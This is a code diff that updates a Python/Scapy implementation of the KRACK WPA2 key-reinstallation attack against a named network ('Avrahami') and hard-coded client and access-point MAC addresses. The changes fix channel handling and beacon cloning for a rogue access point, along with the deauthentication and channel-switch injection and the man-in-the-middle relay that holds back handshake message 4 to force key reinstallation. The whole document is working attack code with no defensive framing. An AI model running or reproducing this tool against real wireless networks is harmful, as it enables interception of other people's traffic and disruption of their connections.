@@ -18,7 +18,7 @@ client_mac = 'c4:9a:02:57:30:23'
 ap_mac = 'd4:35:1d:6c:e2:34'
 ap_ssid = 'Avrahami'
 ap_channel = 11
-client_channel = 4
+client_channel = 6
 MAXTIMEOUT = 60
 SEQ_NUM = 0
 ap_beacon = None
@@ -31,21 +31,39 @@ jamming_thread = None
 PTK_INSTALLED = False
 
 channels = {
-    1: "\x6c\x09",  # 2412
-    2: "\x71\x09",  # 2417
-    3: "\x76\x09",  # 2422
-    4: "\x7b\x09",  # 2427
-    5: "\x80\x09",  # 2432
-    6: "\x85\x09",  # 2437
-    7: "\x8a\x09",  # 2442
-    8: "\x8f\x09",  # 2447
-    9: "\x94\x09",  # 2452
-    10: "\x99\x09",  # 2457
-    11: "\x9e\x09",  # 2462
-    12: "\xa3\x09",  # 2467
-    13: "\xa8\x09",  # 2472
-    14: "\xb4\x09"  # 2484
+    1: b"\x6c\x09",  # 2412
+    2: b"\x71\x09",  # 2417
+    3: b"\x76\x09",  # 2422
+    4: b"\x7b\x09",  # 2427
+    5: b"\x80\x09",  # 2432
+    6: b"\x85\x09",  # 2437
+    7: b"\x8a\x09",  # 2442
+    8: b"\x8f\x09",  # 2447
+    9: b"\x94\x09",  # 2452
+    10: b"\x99\x09",  # 2457
+    11: b"\x9e\x09",  # 2462
+    12: b"\xa3\x09",  # 2467
+    13: b"\xa8\x09",  # 2472
+    14: b"\xb4\x09"  # 2484
 }
+
+channels_int = [
+    'no channel 0',
+    2412,
+    2417,
+    2422,
+    2427,
+    2432,
+    2437,
+    2442,
+    2447,
+    2452,
+    2457,
+    2462,
+    2467,
+    2472,
+    2484
+]
 
 
 def print_green(string: str):
@@ -86,7 +104,7 @@ def initialize_interfaces():
         print_green(f'interface {interface} is on monitor mode')
 
     print_blue('turn off interfaces')
-    os.system('systemctl stop NetworkManager')
+    # os.system('systemctl stop NetworkManager')
     turn_down_iface(iface_ap)
     turn_down_iface(iface_client)
 
@@ -99,7 +117,6 @@ def initialize_interfaces():
     print_blue('turn on interfaces')
     turn_up_iface(iface_ap)
     turn_up_iface(iface_client)
-    os.system(f'iwconfig')
 
 
 def get_ap_mac():
@@ -107,10 +124,9 @@ def get_ap_mac():
     global ap_mac
 
     def check_ap(pkt):
-        global ap_mac, ap_beacon
-        if pkt.haslayer(Dot11Beacon) and pkt[Dot11Elt].info.decode():
+        global ap_mac
+        if pkt.haslayer(Dot11Beacon) and pkt[Dot11Elt].info.decode() == ap_ssid:
             ap_mac = pkt[Dot11].addr2
-            ap_beacon = pkt
             return True
 
     sniff(iface=iface_ap, store=0, stop_filter=check_ap, timeout=MAXTIMEOUT)
@@ -121,6 +137,33 @@ def get_ap_mac():
         sys.exit()
 
     print_green(f'MAC address found {ap_mac}')
+
+
+def get_ap_beacon():
+    global ap_beacon
+
+    def cb_get_ap_beacon(pkt):
+        global ap_beacon
+
+        if (pkt.haslayer(Dot11)
+                and pkt.type == 0
+                and pkt.subtype == 8  # Beacon
+                and pkt[Dot11].addr3 == ap_mac):  # From AP
+            ap_beacon = pkt
+            ssid = 'Avrahami_Test'
+            ap_beacon[Dot11Elt].info = ssid
+            ap_beacon[Dot11Elt].len = len(ssid)
+            set_channel(pkt, client_channel)
+            print(ap_beacon.show())
+            return True
+
+    print_blue('Sniffing an AP Beacon...')
+    sniff(iface=iface_ap, stop_filter=cb_get_ap_beacon, store=0, timeout=MAXTIMEOUT)
+    if ap_beacon is None:
+        # If AP Beacon could not be found
+        print_red('Could not retreive an AP Beacon')
+        sys.exit()
+    print_green('AP Beacon saved!')
 
 
 def set_ap_probe_response():
@@ -163,21 +206,21 @@ def set_interfaces_mac_address():
 
 
 def set_channel(pkt, channel):
-    # print(pkt.show())
-    if pkt is not None and pkt[RadioTap] is not None:
-        pkt[RadioTap].notdecoded = pkt[RadioTap].notdecoded[:10] + bytes(channels[channel], encoding='utf8') + pkt[RadioTap].notdecoded[12:]
+    if pkt is not None and RadioTap in pkt:
+        pkt[RadioTap].ChannelFrequency = channels_int[channel]
 
 
 def send_ap_beacon():
-    global SEQ_NUM
+    global SEQ_NUM, ap_beacon
     print_blue('Rogue AP started. Sending beacons...')
     set_channel(ap_beacon, client_channel)
+
     while True:
         SEQ_NUM += 1
         ap_beacon[RadioTap].SC = SEQ_NUM
         ap_beacon[Dot11].FCfield |= 0x20
 
-        sendp(ap_beacon, iface=iface_client, verbose=False)
+        sendp(ap_beacon, iface=iface_ap, verbose=False)
 
 
 def deauth(e):
@@ -213,14 +256,14 @@ def deauth(e):
         addr2=ap_mac,
         addr3=ap_mac,
         type=0,
-        subtype=0x0d) / Raw(f'\x00\x04\x25\x03\x00{client_channel}\x00')
+        subtype=0x0d) / Raw(f'\x00\x04\x25\x03\x00{chr(client_channel)}\x00')
 
     pkts.append(deauth_pkt1)
     pkts.append(deauth_pkt2)
     pkts.append(csa_pkt)
 
-    deauth_pkt1[RadioTap].notdecoded = deauth_pkt1[RadioTap].notdecoded[:10] + bytes(channels[ap_channel], encoding='utf8') + deauth_pkt1[RadioTap].notdecoded[12:]
-    deauth_pkt1[RadioTap].notdecoded = deauth_pkt1[RadioTap].notdecoded[:10] + bytes(channels[ap_channel], encoding='utf8') + deauth_pkt1[RadioTap].notdecoded[12:]
+    # deauth_pkt1[RadioTap].notdecoded = deauth_pkt1[RadioTap].notdecoded[:10] + bytes(channels[ap_channel], encoding='utf8') + deauth_pkt1[RadioTap].notdecoded[12:]
+    # deauth_pkt1[RadioTap].notdecoded = deauth_pkt1[RadioTap].notdecoded[:10] + bytes(channels[ap_channel], encoding='utf8') + deauth_pkt1[RadioTap].notdecoded[12:]
 
     print_blue(f'Starting deauth on AP {ap_mac} ({ap_ssid}) and client {client_mac}...')
 
@@ -269,7 +312,6 @@ def analyze_traffic(pkt):
             print_green('4-way handshake : Message 4/4')
             return 0
         else:
-            print(pkt[Raw].load)
             print_red("4-way handshake : UNKNOWN")
 
     if pkt[Dot11].FCfield & 0x20 != 0:
@@ -300,12 +342,8 @@ def handle_pkt_client():
                 and pkt[Dot11].addr1 == "ff:ff:ff:ff:ff:ff")
 
     def find_channel(pkt):
-        global channels
-        fq = pkt[RadioTap].notdecoded[10:12]
-        for i,v in channels.iteritems():
-            if v == fq:
-                return i
-        return [pkt[RadioTap].notdecoded[10:12]]
+        fq = pkt[RadioTap].ChannelFrequency
+        return channels_int.index(fq)
 
     global SEQ_NUM, JAMMING, PTK_INSTALLED, jamming_thread, event_jamming
     pkt = sock_client.recv()
@@ -313,6 +351,18 @@ def handle_pkt_client():
     # Drop useless packets
     if pkt is None or Dot11 not in pkt:
         return 0
+
+    # print({
+    #     'type': pkt.type,
+    #     'subType': pkt.subtype,
+    #     'addr': {
+    #         1: pkt[Dot11].addr1,
+    #         2: pkt[Dot11].addr2,
+    #         3: pkt[Dot11].addr3
+    #     },
+    #     # 'channel': find_channel(pkt),
+    #     'is_handshake_packet': is_handshake_packet(pkt)
+    # })
 
     # Don't forward control frames
     if pkt.type == 1:  # TYPE_CNTRL
@@ -344,11 +394,11 @@ def handle_pkt_client():
         print_green('MitM attack has started')
 
     if pkt.type == 2 and pkt.subtype == 0x08:
-        if Raw in pkt and str(pkt[Raw]).startswith("\x02\x03\x0a"):  # Msg4
+        if Raw in pkt and pkt[Raw].load[1:3] == b'\x03\x0a':  # Msg4
             if not PTK_INSTALLED:
                 print_green('PKT installed on client')
             else:
-                print_green('PKT RE-installed on client! Key Reinstallation succes!')
+                print_green('PKT RE-installed on client! Key Reinstallation success!')
             PTK_INSTALLED = True
 
             # Don't forward, AP will think no response and send msg3 again
@@ -379,18 +429,12 @@ def handle_pkt_ap():
         return 0
 
     # Don't forward CSA
-    if pkt.subtype == 0x0d and Raw in pkt and str(pkt[Raw]).startswith("\x00\x04"):
+    if pkt.subtype == 0x0d and Raw in pkt and pkt[Raw].load[1:3] == b'\x00\x04':
         return 0
 
     # Drop Beacons as we inject ours
     if pkt.type == 0 and pkt.subtype == 0x08:  # Beacon
         return 0
-
-    """
-    logger.log("[" + ("*" if pkt[Dot11].FCfield & 0x20 != 0 else " ") + "] [R]AP[/R] : " + pkt_types[pkt.type][
-        pkt.subtype] + " - src: " + pkt[Dot11].addr2 + " | dst: " + pkt[Dot11].addr1 + ' - ' + str(
-        find_channel(pkt)))
-    """
 
     # Check if pkt needs to be forwarded or not
     res = analyze_traffic(pkt)
@@ -413,11 +457,8 @@ def run():
 
 if __name__ == '__main__':
     initialize_interfaces()
-    # get_ap_mac()
-
-    s_ap = L2Socket(iface=iface_ap)
-    s_client = L2Socket(iface=iface_client)
-
+    get_ap_mac()
+    get_ap_beacon()
     set_ap_probe_response()
     set_interfaces_mac_address()
 
